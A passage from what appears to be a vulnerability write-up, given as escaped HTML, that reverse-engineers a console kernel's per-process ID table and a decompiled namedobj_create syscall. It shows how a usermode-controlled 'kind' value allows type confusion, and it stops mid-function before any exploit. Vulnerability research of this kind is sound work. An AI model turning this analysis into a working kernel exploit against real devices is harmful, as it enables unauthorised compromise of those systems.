&lt;div class=&quot;highlight&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;IDT_TYPE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IDT_TYPE_EPORT&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0030&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IDT_TYPE_SBLOCK&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0040&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IDT_TYPE_EVF&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0110&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IDT_TYPE_OSEM&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0120&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IDT_TYPE_BUDGET&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IDT_TYPE_NAMEDOBJ_DBG&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sxlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u16&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idt_bucket&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;idt_bucket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtx&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mutex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num_buckets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cur_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_entries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;id_table_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_entries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;id_table_destroy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;id_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;id_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;id_set_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;id_is_opened&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;id_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;id_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;id_rlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;id_rlock_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;id_wlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;signed&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDT_TYPE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Each process object in the kernel contains its own “idt” (ID Table) object. As can be inferred from the snippet above, the hash table essentially just stores pointers to opaque data blobs, along with a given &lt;code&gt;kind&lt;/code&gt; and &lt;code&gt;name&lt;/code&gt;. Entries may be accessed (and thus “locked”) with either read or write intent.&lt;/p&gt;
&lt;p&gt;Note that &lt;code&gt;IDT_TYPE&lt;/code&gt; is &lt;em&gt;not&lt;/em&gt; a bitfield consisting of only unique powers of 2. This means that if we can control the &lt;code&gt;kind&lt;/code&gt; of an &lt;code&gt;id_entry&lt;/code&gt;, we may be able to cause a type confusion to occur (it is assumed that we may control &lt;code&gt;name&lt;/code&gt;). Sure enough, &lt;code&gt;kind&lt;/code&gt; may be set from usermode via the &lt;code&gt;namedobj_create&lt;/code&gt; syscall:&lt;/p&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;25&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;namedobj_usr_t&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;field_10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sys_namedobj_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;thread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;MACRO_EPERM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ebx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// er14&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;id_table&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r12&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r13&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;namedobj_usr_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// rbx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// er15&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;id_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+8h] [rbp-38h]&lt;/span&gt;
  &lt;span class=&quot;kr&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+10h] [rbp-30h]&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Note this is almost completely usermode-controlled!&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;kind&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;td&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;td_proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sce_idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;copyinstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rv&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;namedobj_usr_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x18uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;M_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;handle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
